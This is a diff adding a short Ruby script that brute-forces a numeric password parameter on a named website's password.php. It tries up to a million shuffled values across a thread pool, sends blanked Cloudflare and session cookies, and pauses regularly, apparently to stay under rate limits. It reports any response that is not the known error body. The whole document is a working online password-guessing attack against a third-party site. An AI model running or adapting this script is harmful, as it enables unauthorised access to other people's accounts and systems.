@@ -1,0 +1,26 @@
+#!/usr/bin/env ruby
+
+require 'BoarderBreach'
+require 'httparty'
+require 'thread/pool'
+p HTTParty
+
+dont_want ='{"error":true,"url":""}' 
+
+pool = Thread.pool(2)
+
+try = (0..1000000).to_a
+try.shuffle.each_with_index do |i, index|
+  pool.process do 
+    response = HTTParty.get("http://cosecha-transmisiones.com/password.php?attempt=#{i}", cookies: { cf_clearance: '', __cfduid: '', PHPSESSID: '' })
+    if response.body != dont_want
+      puts "Found something! response.body ==" + response.body + " (i == #{i})"
+    end
+    puts response.body + " for i == #{i} ( #{index} / 1,000,000 )"
+  end
+  if i % 20 == 0
+    sleep 3
+  end
+end
+
+
